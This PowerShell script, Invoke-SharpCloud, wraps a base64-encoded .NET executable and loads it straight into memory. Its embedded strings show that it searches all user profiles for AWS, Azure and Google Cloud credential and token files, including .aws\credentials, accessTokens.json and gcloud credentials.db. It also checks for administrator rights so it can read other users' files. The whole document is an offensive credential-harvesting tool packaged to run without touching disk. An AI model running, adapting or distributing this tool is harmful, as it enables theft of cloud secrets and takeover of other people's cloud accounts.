function Invoke-SharpCloud
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )
    $base64binary="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAFGIlV4AAAAAAAAAAOAAIgALATAAACIAAAAIAAAAAAAAXkAAAAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACgAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAxAAABPAAAAAGAAALwFAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAADUPgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAZCAAAAAgAAAAIgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAALwFAAAAYAAAAAYAAAAkAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAAKgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABAQAAAAAAAAEgAAAACAAUAnCUAADgZAAADAAIACgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFYoDwAACnMQAAAKICACAABvEQAACioAABswAgCzAAAAAQAAEXMSAAAKCnMSAAAKCwdyAQAAcG8TAAAKB3IfAABwbxMAAAoHckUAAHBvEwAACgdyUQAAcG8TAAAKB3JtAABwbxMAAApyewAAcHMUAAAKDAhzFQAACm8WAAAKbxcAAAoNKy4JbxgAAAp0HQAAAXKfAABwbxkAAAooGgAAChMEBxEEbxsAAAotCAYRBG8TAAAKCW8cAAAKLcreCgksBglvHQAACtzeDG8eAAAKKB8AAAreAAYqAAEcAAACAF8AOpkACgAAAAAAAE4AV6UADBUAAAETMAIAUgAAAAIAABECKCAAAAosSSghAAAKcqkAAHAoIgAACgIoIwAACgIoJAAACgoCcscAAHBvJQAACiwLcs8AAHAoHwAACiooIQAACgYoJgAACigiAAAKKB8AAAoqAAATMAIADwAAAAMAABEWCgMCbyUAAAosAhcKBirOchkBAHAoHwAACnKVAQBwKB8AAApyZgIAcCgfAAAKcjkDAHAoHwAACnIEBABwKB8AAAoqbnLNBABwAignAAAKcgkFAHAoHwAACigDAAAGKgATMAMANwAAAAIAABFySwUAcAIoJwAACgpylwUAcAIoJwAACighAAAKcuMFAHAoIgAACigfAAAKBigDAAAGKAMAAAYqABMwAwBuAAAABAAAEXIrBgBwAignAAAKCnKZBgBwAignAAAKC3L/BgBwAignAAAKKCEAAApyaQcAcCgiAAAKKB8AAAoHKAMAAAYoAwAABgYoKAAACiwjBnLDBwBwFygpAAAKDBYNKwwICZooAwAABgkXWA0JCI5pMu4qTgIoBgAABgIoBwAABgIoCAAABioAABswAwBvAgAABQAAEQKOOWICAAAoAgAABgpyxwcAcAty3QcAcAxy/wcAcCgqAAAKDXINCABwCSgjAAAKKAEAAAYsDHJtCABwKB8AAAorCnK5CABwKB8AAApycAkAcCgrAAAKEwQRBCgEAAAGCBEEKAQAAAYTBQcRBCgEAAAGEwYsDHJ6CQBwKB8AAAorCnIrCgBwKB8AAAoRBSwMcocKAHAoHwAACisKcnALAHAoHwAAChEGLAxy5AsAcCgfAAAKKwpymQwAcCgfAAAKAhMHFhMIOHkBAAARBxEImhMJEQly+wwAcBcoLAAACixMBm8tAAAKEworJhIKKC4AAAoTCyghAAAKcgMNAHAoIgAAChELKCMAAAoRCygJAAAGEgooLwAACi3R3R8BAAASCv4WAgAAG28dAAAK3BEJcl8NAHAXKCwAAAosTAZvLQAAChMKKyYSCiguAAAKEwwoIQAACnIDDQBwKCIAAAoRDCgjAAAKEQwoBgAABhIKKC8AAAot0d3EAAAAEgr+FgIAABtvHQAACtwRCXJnDQBwFygsAAAKLEkGby0AAAoTCismEgooLgAAChMNKCEAAApyAw0AcCgiAAAKEQ0oIwAAChENKAcAAAYSCigvAAAKLdHebBIK/hYCAAAbbx0AAArcEQlycw0AcBcoLAAACixJBm8tAAAKEworJhIKKC4AAAoTDighAAAKcgMNAHAoIgAAChEOKCMAAAoRDigIAAAGEgooLwAACi3R3hQSCv4WAgAAG28dAAAK3CgFAAAGKhEIF1gTCBEIEQeOaT98/v//KCEAAApygQ0AcCgiAAAKKB8AAAooMAAACiYqKAUAAAYqAAE0AAACAOgANh4BDgAAAAACAEMBNnkBDgAAAAACAJ4BM9EBDgAAAAACAPYBMykCDgAAAAAeAigxAAAKKkJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAOADAAAjfgAATAQAAAAFAAAjU3RyaW5ncwAAAABMCQAA1A0AACNVUwAgFwAAEAAAACNHVUlEAAAAMBcAAAgCAAAjQmxvYgAAAAAAAAACAAABRxUCCAkAAAAA+gEzABYAAAEAAAAmAAAAAgAAAAsAAAAIAAAAMQAAAA4AAAAFAAAAAgAAAAEAAAACAAAAAAB4AgEAAAAAAAYA7QHmAwYAWgLmAwYAIQG0Aw8ABgQAAAYASQH4AgYA0AH4AgYAsQH4AgYAQQL4AgYADQL4AgYAJgL4AgYAYAH4AgYANQHHAwYAEwHHAwYAlAH4AgYAewGHAgYAcATsAgYAAQAtAAoA2QR7BAoACgN7BE8AdQMAAAYAMgPsAkcAkwMAAAYA7wSvAgYAyQKvAgYAuQCvAgoAVwN7BAoAzQR7BAoAUQR7BAoAZgR7BAYAsATsAgYAjgDsAgYAzADsAgYAqwARAAYAjQTsAgYAowLsAgYA5QQRAAYAJQMRAAYAPAPsAgAAAAAIAAAAAAABAAEAAQAQAE0DZgBBAAEAAQBQIAAAAACWAJ4DCAEBAGggAAAAAJYAMwQMAQEARCEAAAAAkQCmAHYAAQCkIQAAAACRAFEAFAECAL8hAAAAAJEAcQAaAQQA8yEAAAAAkQAbAHYABAAQIgAAAACRAAABdgAFAFQiAAAAAJEAmgB2AAYAziIAAAAAkQDaAnYABwDkIgAAAACWAPMCHgEIAJQlAAAAAIYYrgMGAAkAAAABAOEAAAABAF4AAAACAKoCAAABAHADAAABAHADAAABAHADAAABAHADAAABAB4ECQCuAwEAEQCuAwYAGQCuAwoAKQCuAxAAMQCuAxAAOQCuAxAAQQCuAxAASQCuAxAAUQCuAxAAWQCuAxAAYQCuAxUAaQCuAxAAcQCuAxAAeQCuAxAAuQClBBoAwQCuAx8AwQCwACUADACuAwYADABNAEMAkQCuAxAA0QCuA0kA0QB3BE8AmQCQA1QAoQCZBFkA4QDjAl4A8QChAmMADAAqBGgAoQC4BG4A+QALAQYAgQChAnIAAQHqAHYACQE8BH8AEQH0AIQAGQFDBIgAAQHqAI4ACQHBBJQAGQEqBJkA8QChApQAGQFKBKIAIQE8BH8AIQEVBLAAEQHUAIQAEQF3AJQAGQEjBNUADACQA94AFACZBO0AFAC4BG4AAQFIAPIAgQCuAwYALgALACQBLgATAC0BLgAbAEwBLgAjAFUBLgArAGUBLgAzAGUBLgA7AGUBLgBDAFUBLgBLAGsBLgBTAGUBLgBbAGUBLgBjAIMBLgBrAK0BLgBzALoBKwB7AJ4AqAC6AD0A5wAEgAAAAQAAAAAAAAAAAAAAAABmAAAABAAAAAAAAAAAAAAA9gAkAAAAAAAEAAAAAAAAAAAAAAD/AHsEAAAAAAAAAExpc3RgMQA8TW9kdWxlPgBTeXN0ZW0uSU8AQ2hlY2tBV1MAbXNjb3JsaWIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMAUmVhZABBZGQAQ2hlY2tDb21tYW5kAGNvbW1hbmQAU2hhcnBDbG91ZABVc2FnZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAElEaXNwb3NhYmxlAENoZWNrR29vZ2xlAENoZWNrRmlsZQBJc0luUm9sZQBXaW5kb3dzQnVpbHRJblJvbGUAQ29uc29sZQBnZXRfVXNlck5hbWUAZmlsZW5hbWUAV3JpdGVMaW5lAGdldF9OZXdMaW5lAENoZWNrQXp1cmUARGlzcG9zZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTaGFycENsb3VkLmV4ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRvU3RyaW5nAHBhdGgAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABXaW5kb3dzUHJpbmNpcGFsAENoZWNrQWxsAGdldF9JdGVtAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAE1hbmFnZW1lbnRPYmplY3RDb2xsZWN0aW9uAFNlYXJjaE9wdGlvbgBFeGNlcHRpb24AU3RyaW5nQ29tcGFyaXNvbgBDbG91ZER1bXAATWFuYWdlbWVudE9iamVjdFNlYXJjaGVyAHVzZXIATWFuYWdlbWVudE9iamVjdEVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgBJc0FkbWluaXN0cmF0b3IALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEdldEZpbGVzAGFyZ3MARXF1YWxzAENvbnRhaW5zAEdldFVzZXJzAEV4aXN0cwBDb25jYXQARm9ybWF0AE1hbmFnZW1lbnRCYXNlT2JqZWN0AE1hbmFnZW1lbnRPYmplY3QAR2V0AFN5c3RlbS5NYW5hZ2VtZW50AEVudmlyb25tZW50AGdldF9DdXJyZW50AEdldEN1cnJlbnQAQ29udmVydABNb3ZlTmV4dABSZWFkQWxsVGV4dABPYmplY3RRdWVyeQBTZWxlY3RRdWVyeQBEaXJlY3RvcnkAV2luZG93c0lkZW50aXR5AAAAHUQAZQBmAGEAdQBsAHQAQQBjAGMAbwB1AG4AdAAAJVcARABBAEcAVQB0AGkAbABpAHQAeQBBAGMAYwBvAHUAbgB0AAALRwB1AGUAcwB0AAAbQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAADWsAcgBiAHQAZwB0AAAjVwBpAG4AMwAyAF8AVQBzAGUAcgBBAGMAYwBvAHUAbgB0AAAJTgBhAG0AZQAAHVsAKgBdACAARgBvAHUAbgBkACAAewAwAH0AOgAABy4AZABiAABJTAAuAC4AIABZAG8AdQAgAHcAaQBsAGwAIAB3AGEAbgB0ACAAdABvACAAYwBvAHAAeQAgAHQAaABpAHMAIABmAGkAbABlAC4AAHsgAFMAaABhAHIAcABDAGwAbwB1AGQAIABjAGEAbgAgAGIAZQAgAHIAdQBuACAAdQBzAGkAbgBnACAAbwBuAGUAIABvAGYAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAYwBvAG0AbQBhAG4AZABzADoADQAKAACAzyAALgAuACAAIgBTAGgAYQByAHAAQwBsAG8AdQBkAC4AZQB4AGUAIABhAGwAbAAiACAAIAAgACAALQAgAFMAZQBhAHIAYwBoAGUAcwAgAGEAbABsACAAdQBzAGUAcgAgAHAAcgBvAGYAaQBsAGUAcwAgAGYAbwByACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAcgBlAGwAYQB0AGUAZAAgAHQAbwAgAGEAbABsACAAYwBsAG8AdQBkACAAcwBlAHIAdgBpAGMAZQBzAC4AAYDRIAAuAC4AIAAiAFMAaABhAHIAcABDAGwAbwB1AGQALgBlAHgAZQAgAGEAdwBzACIAIAAgACAAIAAtACAAUwBlAGEAcgBjAGgAZQBzACAAYQBsAGwAIAB1AHMAZQByACAAcAByAG8AZgBpAGwAZQBzACAAZgBvAHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAByAGUAbABhAHQAZQBkACAAdABvACAAQQBtAGEAegBvAG4AIABXAGUAYgAgAFMAZQByAHYAaQBjAGUAcwAuAAGAySAALgAuACAAIgBTAGgAYQByAHAAQwBsAG8AdQBkAC4AZQB4AGUAIABhAHoAdQByAGUAIgAgACAALQAgAFMAZQBhAHIAYwBoAGUAcwAgAGEAbABsACAAdQBzAGUAcgAgAHAAcgBvAGYAaQBsAGUAcwAgAGYAbwByACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAcgBlAGwAYQB0AGUAZAAgAHQAbwAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQQB6AHUAcgBlAC4AAYDHIAAuAC4AIAAiAFMAaABhAHIAcABDAGwAbwB1AGQALgBlAHgAZQAgAGcAYwBsAG8AdQBkACIAIAAtACAAUwBlAGEAcgBjAGgAZQBzACAAYQBsAGwAIAB1AHMAZQByACAAcAByAG8AZgBpAGwAZQBzACAAZgBvAHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAByAGUAbABhAHQAZQBkACAAdABvACAARwBvAG8AZwBsAGUAIABDAG8AbQBwAHUAdABlAC4AATtDADoAXABVAHMAZQByAHMAXAB7ADAAfQBcAC4AYQB3AHMAXABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAEFbACsAXQAgAEMAaABlAGMAawBpAG4AZwAgAGYAbwByACAAYQB3AHMAYwBsAGkAIABmAGkAbABlAHMALgAuAC4AAEtDADoAXABVAHMAZQByAHMAXAB7ADAAfQBcAC4AYQB6AHUAcgBlAFwAYQBjAGMAZQBzAHMAVABvAGsAZQBuAHMALgBqAHMAbwBuAABLQwA6AFwAVQBzAGUAcgBzAFwAewAwAH0AXAAuAGEAegB1AHIAZQBcAGEAegB1AHIAZQBQAHIAbwBmAGkAbABlAC4AagBzAG8AbgAAR1sAKwBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABBAHoAdQByAGUAIABDAEwASQAgAGYAaQBsAGUAcwAuAC4ALgAAbUMAOgBcAFUAcwBlAHIAcwBcAHsAMAB9AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABnAGMAbABvAHUAZABcAGwAZQBnAGEAYwB5AF8AYwByAGUAZABlAG4AdABpAGEAbABzAABlQwA6AFwAVQBzAGUAcgBzAFwAewAwAH0AXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAGcAYwBsAG8AdQBkAFwAYwByAGUAZABlAG4AdABpAGEAbABzAC4AZABiAABpQwA6AFwAVQBzAGUAcgBzAFwAewAwAH0AXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAGcAYwBsAG8AdQBkAFwAYQBjAGMAZQBzAHMAXwB0AG8AawBlAG4AcwAuAGQAYgAAWVsAKwBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABHAG8AbwBnAGwAZQAgAEMAbwBtAHAAdQB0AGUAIABTAEQASwAgAGYAaQBsAGUAcwAuAC4ALgAAAyoAABVBAHoAdQByAGUAXABDAEwASQAyAAAhZwBvAG8AZwBsAGUALQBjAGwAbwB1AGQALQBzAGQAawABDUEAVwBTAEMATABJAABfWwArAF0AIABPAHAAZQByAGEAdABpAG4AZwAgAGkAbgAgAHQAaABlACAAYwBvAG4AdABlAHgAdAAgAG8AZgAgAHQAaABlACAAJwB7ADAAfQAnACAAdQBzAGUAcgAuAAFLWwAqAF0AIABDAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgAGkAcwAgAGEAbgAgAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIQAAgLVbACEAXQAgAEMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAaQBzACAATgBPAFQAIABhAG4AIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACEAIABDAGwAbwB1AGQAIABmAGkAbABlAHMAIABmAG8AcgAgAG8AdABoAGUAcgAgAHUAcwBlAHIAcwAgAG0AYQB5ACAAbgBvAHQAIABiAGUAIAByAGUAdAB1AHIAbgBlAGQALgAACVAAQQBUAEgAAICvWwArAF0AIABBAFcAUwBDAEwASQAgAGUAeABpAHMAdABzACAAaQBuACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAnAHMAIABQAEEAVABIAC4AIABZAG8AdQAgAHMAaABvAHUAbABkACAAYgBlACAAYQBiAGwAZQAgAHQAbwAgAHUAcwBlACAAJwBhAHcAcwAnACAAYwBvAG0AbQBhAG4AZABzAC4AAVtbACsAXQAgAEEAVwBTAEMATABJACAAaQBzACAAbgBvAHQAIABpAG4AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACcAcwAgAFAAQQBUAEgALgABgOdbACsAXQAgAEcAbwBvAGcAbABlACAAQwBvAG0AcAB1AHQAZQAgAFMARABLACAAZQB4AGkAcwB0AHMAIABpAG4AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACcAcwAgAFAAQQBUAEgALgAgAFkAbwB1ACAAcwBoAG8AdQBsAGQAIABiAGUAIABhAGIAbABlACAAdABvACAAdQBzAGUAIAAnAGcAYwBs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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [SharpCloud.CloudDump]::main($Command.Split(" "))
  
}